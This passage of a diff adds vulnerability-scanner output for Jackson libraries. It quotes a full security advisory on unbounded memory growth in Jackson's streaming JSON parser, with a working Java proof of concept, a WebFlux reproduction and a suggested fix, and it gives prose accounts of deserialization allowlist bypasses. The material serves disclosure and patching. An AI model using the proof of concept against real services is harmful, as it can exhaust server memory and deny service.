+                        │      │                   This is the same vulnerability class, same advisory wording
+                        │      │                   ("Memory Exhaustion: Unbounded allocation in TextBuffer from
+                        │      │                    excessively long numbers"), same parser class — just the
+                        │      │                   streaming path the original fix didn't cover. The fix to the
+                        │      │                    *fraction* path is correct (see `_finishFloatFraction` at
+                        │      │                   line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in
+                        │      │                   2.18.6, where `_setFractLength(fractLen)` IS called before
+                        │      │                   the `NOT_AVAILABLE` return); the equivalent call is missing
+                        │      │                   from every integer-digit path.
+                        │      │                   ## Affected versions
+                        │      │                   Verified on the patched releases:
+                        │      │                   - `com.fasterxml.jackson.core:jackson-core` **2.18.6**
+                        │      │                   - `com.fasterxml.jackson.core:jackson-core` **2.21.1**
+                        │      │                   Structurally identical code in `tools.jackson.core` 3.0.x /
+                        │      │                   3.1.x — same `NonBlockingUtf8JsonParserBase` class, same
+                        │      │                   `_setIntLength` rollout, same NOT_AVAILABLE returns without
+                        │      │                   validation. Not retested but presumed vulnerable.
+                        │      │                   ## Affected code
+                        │      │                   [`src/main/java/com/fasterxml/jackson/core/json/async/NonBlo
+                        │      │                   ckingUtf8JsonParserBase.java`](https://github.com/FasterXML/
+                        │      │                   jackson-core/blob/b0c428e6/src/main/java/com/fasterxml/jacks
+                        │      │                   on/core/json/async/NonBlockingUtf8JsonParserBase.java) in
+                        │      │                   2.18.6 / 2.21.1.
+                        │      │                   ### Site 1 — `_startPositiveNumber(int ch)` lines
+                        │      │                   1320-1330:
+                        │      │                   ```java
+                        │      │                   if (outPtr >= outBuf.length) {
+                        │      │                       // NOTE: must expand to ensure contents all in a single
+                        │      │                   buffer (to keep
+                        │      │                       // other parts of parsing simpler)
+                        │      │                       outBuf = _textBuffer.expandCurrentSegment();
+                        │      │                   }
+                        │      │                   outBuf[outPtr++] = (char) ch;
+                        │      │                   if (++_inputPtr >= _inputEnd) {
+                        │      │                       _minorState = MINOR_NUMBER_INTEGER_DIGITS;
+                        │      │                       _textBuffer.setCurrentLength(outPtr);
+                        │      │                       return _updateTokenToNA();          // <-- no
+                        │      │                   validateIntegerLength(outPtr)
+                        │      │                   ```
+                        │      │                   ### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:
+                        │      │                   protected JsonToken _finishNumberIntegralPart(char[] outBuf,
+                        │      │                    int outPtr) throws IOException {
+                        │      │                       int negMod = _numberNegative ? -1 : 0;
+                        │      │                       while (true) {
+                        │      │                           if (_inputPtr >= _inputEnd) {
+                        │      │                               _minorState = MINOR_NUMBER_INTEGER_DIGITS;
+                        │      │                               _textBuffer.setCurrentLength(outPtr);
+                        │      │                               return _updateTokenToNA();    // <-- no
+                        │      │                   validateIntegerLength(outPtr + negMod)
+                        │      │                           }
+                        │      │                           int ch = getByteFromBuffer(_inputPtr) & 0xFF;
+                        │      │                           if (ch < INT_0) {
+                        │      │                               if (ch == INT_PERIOD) {
+                        │      │                                   _setIntLength(outPtr+negMod);   // <--
+                        │      │                   validated here
+                        │      │                                   ++_inputPtr;
+                        │      │                                   return _startFloat(outBuf, outPtr, ch);
+                        │      │                               }
+                        │      │                               break;
+                        │      │                           if (ch > INT_9) {
+                        │      │                               if ((ch | 0x20) == INT_e) {
+                        │      │                           ++_inputPtr;
+                        │      │                           if (outPtr >= outBuf.length) {
+                        │      │                               outBuf = _textBuffer.expandCurrentSegment();
+                        │      │                           outBuf[outPtr++] = (char) ch;
+                        │      │                       }
+                        │      │                       _setIntLength(outPtr+negMod);            // <--
+                        │      │                       return _valueComplete(JsonToken.VALUE_NUMBER_INT);
+                        │      │                   The pattern recurs at lines 1297, 1329, 1343, 1365, 1395,
+                        │      │                   1409, 1437, 1467, 1481, 1586, 1644, 1698 — every "ran out of
+                        │      │                    input mid-integer" exit returns to the caller without
+                        │      │                   validating the accumulator length.
+                        │      │                   ### Compare with the fraction path that is correct
+                        │      │                   `_finishFloatFraction` lines 1827-1838:
+                        │      │                   while (loop) {
+                        │      │                       if (ch >= INT_0 && ch <= INT_9) {
+                        │      │                           ++fractLen;
+                        │      │                               _setFractLength(fractLen);          // <--
+                        │      │                   VALIDATED
+                        │      │                               return JsonToken.NOT_AVAILABLE;
+                        │      │                           ch = getNextSignedByteFromBuffer();
+                        │      │                       ...
+                        │      │                   ## Impact
+                        │      │                   Reactive frameworks (Spring WebFlux / Reactor, Quarkus,
+                        │      │                   Helidon, Vert.x JSON, anything wrapping
+                        │      │                   `JsonFactory.createNonBlockingByteArrayParser()` or
+                        │      │                   `createNonBlockingByteBufferParser()`) feed inbound
+                        │      │                   HTTP/gRPC bytes to the async parser as they arrive.
+                        │      │                   Operators who set
+                        │      │                   `StreamReadConstraints.builder().maxNumberLength(N)` on the
+                        │      │                   assumption that this caps memory per number value are not
+                        │      │                   getting that guarantee in chunked-feed scenarios. The parser
+                        │      │                    silently accumulates digits up to `maxStringLength` (20 MiB
+                        │      │                    default) per concurrent connection. Multiply by
+                        │      │                   attacker-controlled concurrency to OOM the JVM.
+                        │      │                   The synchronous parsers (`UTF8StreamJsonParser`,
+                        │      │                   `ReaderBasedJsonParser`) and the async parser on *complete*
+                        │      │                   input are not affected — those paths go through
+                        │      │                   `_setIntLength` or `ParserBase._reportTooLongIntegral`
+                        │      │                   correctly.
+                        │      │                   CWE-770 (Allocation of Resources Without Limits or
+                        │      │                   Throttling), CVSS roughly the same as the parent advisory
+                        │      │                   (Network / Low complexity / High availability impact). The
+                        │      │                   parent advisory was scored CVSS 8.7 High.
+                        │      │                   ## Proof of concept
+                        │      │                   Standalone PoC, no Maven required:
+                        │      │                   mkdir poc && cd poc
+                        │      │                   curl -sLo jackson-core-2.18.6.jar
+                        │      │                   https://repo1.maven.org/maven2/com/fasterxml/jackson/core/ja
+                        │      │                   ckson-core/2.18.6/jackson-core-2.18.6.jar
+                        │      │                   cat > PoC.java <<'EOF'
+                        │      │                   import com.fasterxml.jackson.core.*;
+                        │      │                   import com.fasterxml.jackson.core.async.ByteArrayFeeder;
+                        │      │                   public class PoC {
+                        │      │                       public static void main(String[] args) throws Exception
+                        │      │                   {
+                        │      │                           StreamReadConstraints strict =
+                        │      │                   StreamReadConstraints.builder()
+                        │      │                                   .maxNumberLength(1000)
+                        │      │                                   .build();
+                        │      │                           JsonFactory f = new JsonFactoryBuilder()
+                        │      │                                   .streamReadConstraints(strict)
+                        │      │                           // Sanity: synchronous parser rejects 5000-digit
+                        │      │                   int.
+                        │      │                           try (JsonParser p = f.createParser("{\"v\":" +
+                        │      │                   "1".repeat(5000) + "}")) {
+                        │      │                               while (p.nextToken() != null) { /* drive */ }
+                        │      │                               System.out.println("[-] BUG ABSENT: sync parser
+                        │      │                   accepted");
+                        │      │                               return;
+                        │      │                           } catch (Exception e) {
+                        │      │                               System.out.println("[+] sync parser rejected
+                        │      │                   5000-digit int: " + e.getClass().getSimpleName());
+                        │      │                           // Bug: async parser, chunked, no terminator.
+                        │      │                           JsonParser ap =
+                        │      │                   f.createNonBlockingByteArrayParser();
+                        │      │                           ByteArrayFeeder feeder = (ByteArrayFeeder) ap;
+                        │      │                           byte[] preamble = "{\"v\":".getBytes("UTF-8");
+                        │      │                           feeder.feedInput(preamble, 0, preamble.length);
+                        │      │                           while (ap.nextToken() != JsonToken.NOT_AVAILABLE) {
+                        │      │                   /* drain */ }
+                        │      │                           byte[] digits = new byte[16 * 1024];
+                        │      │                           for (int i = 0; i < digits.length; i++) digits[i] =
+                        │      │                   (byte) ('1' + (i % 9));
+                        │      │                           for (int c = 0; c < 600; c++) {
+                        │      │                               feeder.feedInput(digits, 0, digits.length);
+                        │      │                               JsonToken t = ap.nextToken();
+                        │      │                               if (t != JsonToken.NOT_AVAILABLE) {
+                        │      │                                   System.out.println("[-] unexpected token: "
+                        │      │                   + t);
+                        │      │                                   return;
+                        │      │                           System.out.println("[+] BUG PRESENT: async parser
+                        │      │                   accepted ~9.83 MB of digits with maxNumberLength=1000");
+                        │      │                           // Closing the number now finally triggers the
+                        │      │                   validator.
+                        │      │                           feeder.feedInput("}".getBytes("UTF-8"), 0, 1);
+                        │      │                           feeder.endOfInput();
+                        │      │                           try {
+                        │      │                               while (ap.nextToken() != null) { /* drive */ }
+                        │      │                               System.out.println("[*] late rejection on close:
+                        │      │                    " + e.getMessage().split("\n")[0]);
+                        │      │                           ap.close();
+                        │      │                   EOF
+                        │      │                   javac -cp jackson-core-2.18.6.jar PoC.java
+                        │      │                   java -Xmx256m -cp jackson-core-2.18.6.jar:. PoC
+                        │      │                   Observed output against `jackson-core-2.18.6`:
+                        │      │                   [+] sync parser rejected 5000-digit int:
+                        │      │                   StreamConstraintsException
+                        │      │                   [+] BUG PRESENT: async parser accepted ~9.83 MB of digits
+                        │      │                   with maxNumberLength=1000
+                        │      │                   [*] late rejection on close: Number value length (9830400)
+                        │      │                   exceeds the maximum allowed (1000, from
+                        │      │                   `StreamReadConstraints.getMaxNumberLength()`)
+                        │      │                   Observed output against `jackson-core-2.21.1`: identical.
+                        │      │                   The 9.83 MB figure is purely a function of the loop bound
+                        │      │                   (600 chunks * 16 KiB). The actual ceiling is
+                        │      │                   `maxStringLength = 20 MiB`. With the strict policy declared
+                        │      │                   as `maxNumberLength = 1000`, the parser permits **9830x**
+                        │      │                   more allocation than the policy allows. With
+                        │      │                   `maxStringLength` left at the default 20 MiB, an attacker
+                        │      │                   can drive a single connection to 40 MiB of `char[]` heap
+                        │      │                   (chars are 2 bytes each) before the validator finally fires
+                        │      │                   on terminator/`endOfInput()`. Multiply by concurrent
+                        │      │                   connections.
+                        │      │                   ## End-to-end reproduction through real HTTP
+                        │      │                   Supplements the standalone PoC with a running Spring Boot
+                        │      │                   WebFlux server,
+                        │      │                   driving the same bug through the actual reactor-netty +
+                        │      │                   Jackson2JsonDecoder
+                        │      │                   streaming-decode path that production reactive endpoints
+                        │      │                   use.
+                        │      │                   Setup:
+                        │      │                   - Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14,
+                        │      │                   reactor-netty 1.1.23)
+                        │      │                   - jackson-databind 2.17.2, jackson-core overridden:
+                        │      │                     - VULN run:
+                        │      │                   `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest
+                        │      │                   published)
+                        │      │                     - PATCHED run: `2.18.8-SNAPSHOT` built from the fix
+                        │      │                   branch
+                        │      │                   - JVM: OpenJDK 17.0.18
+                        │      │                   - Server `JsonFactory` configured with
+                        │      │                   `StreamReadConstraints.builder().maxNumberLength(1000).build
+                        │      │                   ()`
+                        │      │                   Endpoint under test exposes the `Flux<DataBuffer>` request
+                        │      │                   body directly to
+                        │      │                   `Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so
+                        │      │                   the parser sees one
+                        │      │                   HTTP chunk per `feedInput` (the same pattern used for any
+                        │      │                   `@RequestBody Flux<...>` / streaming JSON decoder in
+                        │      │                   WebFlux). A raw-socket
+                        │      │                   HTTP/1.1 chunked client streams `{"v":1` then 250 chunks of
+                        │      │                   200 digit bytes
+                        │      │                   each (50,000 digits total) at 20ms intervals, then writes
+                        │      │                   the closing `}`.
+                        │      │                   VULN — jackson-core 2.18.7:
+                        │      │                   [VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks;
+                        │      │                   server still accepting
+                        │      │                   [VULN-SMALLCHUNK] full POST sent (50000 digits). Response:
+                        │      │                   HTTP/1.1 200 OK
+                        │      │                   ERR after 6548ms
+                        │      │                   cause=com.fasterxml.jackson.core.exc.StreamConstraintsExcept
+                        │      │                   ion:
+                        │      │                          Number value length (50000) exceeds the maximum
+                        │      │                   allowed (1000, ...)
+                        │      │                   Server-side controller trace (250 DataBuffer arrivals
+                        │      │                   elided):
+                        │      │                   [ctrl] DataBuffer arrived size=6   ms=39       <- '{"v":1'
+                        │      │                   [ctrl] DataBuffer arrived size=200 ms=42
+                        │      │                   ...
+                        │      │                   [ctrl] DataBuffer arrived size=199 ms=5993
+                        │      │                   [ctrl] DataBuffer arrived size=1   ms=6518     <- closing
+                        │      │                   '}'
+                        │      │                   [ctrl] ERR after 6548ms ... Number value length (50000)
+                        │      │                   exceeds ...
+                        │      │                   Server held all 50,000 digit characters in `_textBuffer` for
+                        │      │                    6.5 seconds with
+                        │      │                   `maxNumberLength=1000` declared. The validator never fires
+                        │      │                   during streaming;
+                        │      │                   it only fires at value-completion when the closing `}`
+                        │      │                   arrives.
+                        │      │                   PATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):
+                        │      │                   [PATCHED-SMALLCHUNK] connection broke after 2801 digits at
+                        │      │                   chunk 14: [Errno 32] Broken pipe
+                        │      │                   [PATCHED-SMALLCHUNK] DONE: digits_sent=2801
+                        │      │                   status=connection-broke-mid-stream
+                        │      │                   Server-side controller trace:
+                        │      │                   [ctrl] DataBuffer arrived size=6   ms=129
+                        │      │                   [ctrl] DataBuffer arrived size=200 ms=142
+                        │      │                   [ctrl] DataBuffer arrived size=200 ms=145
+                        │      │                   [ctrl] DataBuffer arrived size=200 ms=146
+                        │      │                   [ctrl] DataBuffer arrived size=200 ms=147
+                        │      │                   [ctrl] ERR after 155ms ... Number value length (1001)
+                        │      │                   exceeds the maximum allowed (1000, ...)
+                        │      │                   Patched server raises `StreamConstraintsException` at 155ms
+                        │      │                   after only 5
+                        │      │                   DataBuffers, exactly when the accumulated digit count
+                        │      │                   crosses
+                        │      │                   `maxNumberLength=1000`. The connection is reset mid-stream
+                        │      │                   rather than the
+                        │      │                   parser silently consuming the rest of the attacker's
+                        │      │                   payload.
+                        │      │                   Side-by-side:
+                        │      │                   | Build | Chunks accepted before exception | Digits buffered
+                        │      │                    | Time to detection |
+                        │      │                   |---|---|---|---|
+                        │      │                   | jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the
+                        │      │                    configured limit) | 6,548ms — only at terminator |
+                        │      │                   | 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment
+                        │      │                   threshold crossed |
+                        │      │                   Note on the default `@RequestBody Mono<JsonNode>` path: that
+                        │      │                    path cannot
+                        │      │                   distinguish the two builds because Spring's `decodeToMono`
+                        │      │                   joins all
+                        │      │                   DataBuffers into one before parsing. The exploitable shape
+                        │      │                   is the
+                        │      │                   streaming-decode path (`Flux<JsonNode>` / `@RequestBody
+                        │      │                   Flux<...>` /
+                        │      │                   WebSocket / SSE / any direct
+                        │      │                   `decoder.decode(Flux<DataBuffer>, ...)` call),
+                        │      │                   which is also what `Jackson2Tokenizer` uses for any
+                        │      │                   streaming JSON
+                        │      │                   deserialization in WebFlux and Quarkus reactive REST.
+                        │      │                   ## Suggested fix
+                        │      │                   Mirror the pattern already used in `_finishFloatFraction`.
+                        │      │                   At every site that returns `_updateTokenToNA()` (or
+                        │      │                   `JsonToken.NOT_AVAILABLE`) with `_minorState =
+                        │      │                   MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr +
+                        │      │                   negMod)` first. Concretely, the diff to
+                        │      │                   `NonBlockingUtf8JsonParserBase.java` would be:
+                        │      │                   ```diff
+                        │      │                        protected JsonToken _finishNumberIntegralPart(char[]
+                        │      │                   outBuf, int outPtr) throws IOException {
+                        │      │                            int negMod = _numberNegative ? -1 : 0;
+                        │      │                            while (true) {
+                        │      │                                if (_inputPtr >= _inputEnd) {
+                        │      │                                    _minorState = MINOR_NUMBER_INTEGER_DIGITS;
+                        │      │                                    _textBuffer.setCurrentLength(outPtr);
+                        │      │                   +               
+                        │      │                   _streamReadConstraints.validateIntegerLength(outPtr +
+                        │      │                   negMod);
+                        │      │                                    return _updateTokenToNA();
+                        │      │                                }
+                        │      │                   Note: `_setIntLength` itself can't be used as-is because it
+                        │      │                   also assigns `_intLength`, and `_intLength` must not be set
+                        │      │                   until the integer is truly complete (subsequent fraction
+                        │      │                   handling reads `_intLength`). The minimal fix is to call
+                        │      │                   only the validator, as shown.
+                        │      │                   Apply the same one-line insertion before each `return
+                        │      │                   _updateTokenToNA();` that exits with `_minorState =
+                        │      │                   MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12
+                        │      │                    lines total).
+                        │      │                   Alternatively, a heavier refactor: also gate
+                        │      │                   `_textBuffer.expandCurrentSegment()` calls inside the
+                        │      │                   digit-accumulation loops on `outPtr < maxNumberLength` so
+                        │      │                   that the validator fires at the moment the buffer would be
+                        │      │                   enlarged past the limit, rather than waiting for the next
+                        │      │                   chunk boundary. Either approach is sufficient.
+                        │      │                   ## Credit
+                        │      │                   Reported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant
+                        │      │                    hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq. 
+                        │      ├ Severity        : HIGH 
+                        │      ├ VendorSeverity   ─ ghsa: 3 
+                        │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
+                        │      │                         │            :N/VA:H/SC:N/SI:N/SA:N 
+                        │      │                         ╰ V40Score : 8.7 
+                        │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-core 
+                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-core/commit/050b4
+                        │      │                  │      29804dce2a7e08f0be1b0b4c3d040fdb9cd 
+                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-core/commit/4cdd5
+                        │      │                  │      29749da396cc7edf6d4a2aad41d47902641 
+                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-core/commit/c5941
+                        │      │                  │      e5aae7fd5aeac55d66933cfb82b9aabeef8 
+                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-core/pull/1611 
+                        │      │                  ╰ [5]: https://github.com/FasterXML/jackson-core/security/adv
+                        │      │                         isories/GHSA-r7wm-3cxj-wff9 
+                        │      ├ PublishedDate   : 2026-07-21T21:58:53Z 
+                        │      ╰ LastModifiedDate: 2026-07-21T21:58:53Z 
+                        ├ [1]  ╭ VulnerabilityID : CVE-2026-54512 
+                        │      ├ VendorIDs        ─ [0]: GHSA-j3rv-43j4-c7qm 
+                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+                        │      ├ PkgPath         : openaf/openaf.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
+                        │      │                  │       @2.21.1 
+                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
+                        │      ├ InstalledVersion: 2.21.1 
+                        │      ├ FixedVersion    : 2.18.8, 3.1.4, 2.21.4 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e127
+                        │      │                  │         9a8305ba35c82bf9229f 
+                        │      │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f
+                        │      │                            7ea46f72dd8aa890c14b 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54512 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:9f6ce7a8c23db461da5468fa6d3707bc366da7bb4bad4fc7ae1c1
+                        │      │                   482a422f2e2 
+                        │      ├ Title           : jackson-databind: jackson-databind: Arbitrary code execution
+                        │      │                    via PolymorphicTypeValidator bypass 
+                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+                        │      │                   functionality and tree-model for Jackson Data Processor.
+                        │      │                   From 2.10.0 until 2.18.8, 2.21.4, and 3.1.4,
+                        │      │                   jackson-databind's PolymorphicTypeValidator (PTV) is the
+                        │      │                   primary safety mechanism guarding polymorphic
+                        │      │                   deserialization. When polymorphic typing is enabled and a
+                        │      │                   type identifier contains generic parameters (i.e. the type
+                        │      │                   ID string contains <),
+                        │      │                   DatabindContext._resolveAndValidateGeneric() validates only
+                        │      │                   the raw container class name (the substring before <)
+                        │      │                   against the configured PTV. If the container type is
+                        │      │                   approved, the method parses the full canonical type string
+                        │      │                   via TypeFactory.constructFromCanonical() and returns the
+                        │      │                   fully parameterized type without ever validating the nested
+                        │      │                   type arguments against the PTV. The nested type arguments
+                        │      │                   are then resolved, instantiated, and populated as beans
+                        │      │                   during deserialization. An attacker who controls the type ID
+                        │      │                    can therefore place a denied class as a generic type
+                        │      │                   parameter of an allowed container — for example
+                        │      │                   java.util.ArrayList<com.evil.Gadget> when only
+                        │      │                   java.util.ArrayList is allow-listed. The container passes
+                        │      │                   the PTV check; com.evil.Gadget is loaded via
+                        │      │                   Class.forName(name, true, loader), instantiated, and its
+                        │      │                   properties are set from attacker-controlled JSON. This
+                        │      │                   completely bypasses an explicitly configured PTV allow-list.
+                        │      │                    This vulnerability is fixed in 2.18.8, 2.21.4, and 3.1.4.[
+                        │      │                   m 
+                        │      ├ Severity        : HIGH 
+                        │      ├ CweIDs           ╭ [0]: CWE-184 
+                        │      │                  ╰ [1]: CWE-502 
+                        │      ├ VendorSeverity   ╭ alma       : 3 
+                        │      │                  ├ amazon     : 3 
+                        │      │                  ├ ghsa       : 3 
+                        │      │                  ├ oracle-oval: 3 
+                        │      │                  ╰ redhat     : 3 
+                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H
+                        │      │                  │        │           /A:H 
+                        │      │                  │        ╰ V3Score : 8.1 
+                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H
+                        │      │                           │           /A:H 
+                        │      │                           ╰ V3Score : 8.1 
+                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:40895 
+                        │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-54512 
+                        │      │                  ├ [2] : https://bugzilla.redhat.com/2492010 
+                        │      │                  ├ [3] : https://bugzilla.redhat.com/2492015 
+                        │      │                  ├ [4] : https://errata.almalinux.org/9/ALSA-2026-40895.html 
+                        │      │                  ├ [5] : https://github.com/FasterXML/jackson-databind 
+                        │      │                  ├ [6] : https://github.com/FasterXML/jackson-databind/commit/
+                        │      │                  │       434d6c511de7fdd9872f29157aafb6162d12d8d5 
+                        │      │                  ├ [7] : https://github.com/FasterXML/jackson-databind/issues/
+                        │      │                  │       5988 
+                        │      │                  ├ [8] : https://github.com/FasterXML/jackson-databind/securit
+                        │      │                  │       y/advisories/GHSA-j3rv-43j4-c7qm 
+                        │      │                  ├ [9] : https://linux.oracle.com/cve/CVE-2026-54512.html 
+                        │      │                  ├ [10]: https://linux.oracle.com/errata/ELSA-2026-40895.html 
+                        │      │                  ├ [11]: https://nvd.nist.gov/vuln/detail/CVE-2026-54512 
+                        │      │                  ╰ [12]: https://www.cve.org/CVERecord?id=CVE-2026-54512 
+                        │      ├ PublishedDate   : 2026-06-23T21:17:02.203Z 
+                        │      ╰ LastModifiedDate: 2026-06-27T21:01:36.47Z 
+                        ├ [2]  ╭ VulnerabilityID : CVE-2026-54513 
+                        │      ├ VendorIDs        ─ [0]: GHSA-rmj7-2vxq-3g9f 
+                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+                        │      ├ PkgPath         : openaf/openaf.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
+                        │      │                  │       @2.21.1 
+                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
+                        │      ├ InstalledVersion: 2.21.1 
+                        │      ├ FixedVersion    : 2.18.8, 2.21.4, 3.1.4 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e127
+                        │      │                  │         9a8305ba35c82bf9229f 
+                        │      │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f
+                        │      │                            7ea46f72dd8aa890c14b 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54513 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:2260021b06d899e0e5bfd23feeac3ada8f5825e01357e5a820eac
+                        │      │                   7d8bdb8f979 
+                        │      ├ Title           : jackson-databind: Jackson-databind: Security bypass allows
+                        │      │                   arbitrary code execution 
+                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
+                        │      │                   functionality and tree-model for Jackson Data Processor.
+                        │      │                   From 2.10.0 until 2.18.8, 2.21.4, and 3.1.4,
+                        │      │                   BasicPolymorphicTypeValidator.Builder.allowIfSubTypeIsArray(
+                        │      │                   ) allowlists any array type based only on clazz.isArray(),
+                        │      │                   without validating the array's component (element) type
+                        │      │                   against the configured allowlist. A PTV built with
+                        │      │                   allowIfSubTypeIsArray() plus an explicit concrete-type
+                        │      │                   allowlist therefore still permits EvilType[] even though
+                        │      │                   EvilType is not allowlisted. When Jackson deserializes the
+                        │      │                   elements and no per-element type IDs are present, it
+                        │      │                   instantiates the component type directly with no further PTV
+                        │      │                    check, bypassing the allowlist. This vulnerability is fixed
+                        │      │                    in 2.18.8, 2.21.4, and 3.1.4. 
+                        │      ├ Severity        : HIGH 
+                        │      ├ CweIDs           ─ [0]: CWE-184 
+                        │      ├ VendorSeverity   ╭ alma       : 3 
+                        │      │                  ├ amazon     : 3 
+                        │      │                  ├ ghsa       : 3 
+                        │      │                  ├ oracle-oval: 3 
+                        │      │                  ╰ redhat     : 3 
+                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H
+                        │      │                  │        │           /A:H 
+                        │      │                  │        ╰ V3Score : 8.1 
+                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H
+                        │      │                           │           /A:H 
+                        │      │                           ╰ V3Score : 8.1 
+                        │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:36839 
+                        │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:40895 
+                        │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:41951 
+                        │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:43218 
+                        │      │                  ├ [4] : https://access.redhat.com/security/cve/CVE-2026-54513 
+                        │      │                  ├ [5] : https://bugzilla.redhat.com/2492010 
+                        │      │                  ├ [6] : https://bugzilla.redhat.com/2492015 
+                        │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2492010 
+                        │      │                  ├ [8] : https://errata.almalinux.org/9/ALSA-2026-40895.html 
+                        │      │                  ├ [9] : https://github.com/FasterXML/jackson-databind 
+                        │      │                  ├ [10]: https://github.com/FasterXML/jackson-databind/commit/
+                        │      │                  │       01d1692c8d0ed03e51a0e3c4f8a9e6908e4931e5 
+                        │      │                  ├ [11]: https://github.com/FasterXML/jackson-databind/commit/
+                        │      │                  │       24529da29fdf46ff94ca38de9ebf31cd188f5e8e 
+                        │      │                  ├ [12]: https://github.com/FasterXML/jackson-databind/issues/
+                        │      │                  │       5981 
+                        │      │                  ├ [13]: https://github.com/FasterXML/jackson-databind/issues/
+                        │      │                  │       5983 
+                        │      │                  ├ [14]: https://github.com/FasterXML/jackson-databind/pull/5984 
+                        │      │                  ├ [15]: https://github.com/FasterXML/jackson-databind/securit
+                        │      │                  │       y/advisories/GHSA-rmj7-2vxq-3g9f 
+                        │      │                  ├ [16]: https://linux.oracle.com/cve/CVE-2026-54513.html 
+                        │      │                  ├ [17]: https://linux.oracle.com/errata/ELSA-2026-40895.html 
+                        │      │                  ├ [18]: https://nvd.nist.gov/vuln/detail/CVE-2026-54513 
+                        │      │                  ├ [19]: https://security.access.redhat.com/data/csaf/v2/vex/2
+                        │      │                  │       026/cve-2026-54513.json 
+                        │      │                  ╰ [20]: https://www.cve.org/CVERecord?id=CVE-2026-54513 
+                        │      ├ PublishedDate   : 2026-06-23T21:17:02.333Z 
+                        │      ╰ LastModifiedDate: 2026-07-22T12:18:14.063Z 
+                        ├ [3]  ╭ VulnerabilityID : CVE-2026-54514 
+                        │      ├ VendorIDs        ─ [0]: GHSA-hgj6-7826-r7m5 
+                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
+                        │      ├ PkgPath         : openaf/openaf.jar 
+                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
+                        │      │                  │       @2.21.1 
+                        │      │                  ╰ UID : 6bd66f14c6cb3d57 
+                        │      ├ InstalledVersion: 2.21.1 
+                        │      ├ FixedVersion    : 2.18.8, 2.21.4, 3.1.4 
+                        │      ├ Status          : fixed 
+                        │      ├ Layer            ╭ Digest: sha256:83492eba00bac8f5739cfd098b8001f62dda2954e127
+                        │      │                  │         9a8305ba35c82bf9229f 
+                        │      │                  ╰ DiffID: sha256:83ae18ee4d1bbbf1631360a8a320c413c8e195ae680f
+                        │      │                            7ea46f72dd8aa890c14b 
+                        │      ├ SeveritySource  : ghsa 
+                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54514 
+                        │      ├ DataSource       ╭ ID  : ghsa 
+                        │      │                  ├ Name: GitHub Security Advisory Maven 
+                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                        │      │                          cosystem%3Amaven 
+                        │      ├ Fingerprint     : sha256:2e2de016693bd8c7420c5ef2e52201d220f48c0fb8b837ba2586b
+                        │      │                   110b02442cd 
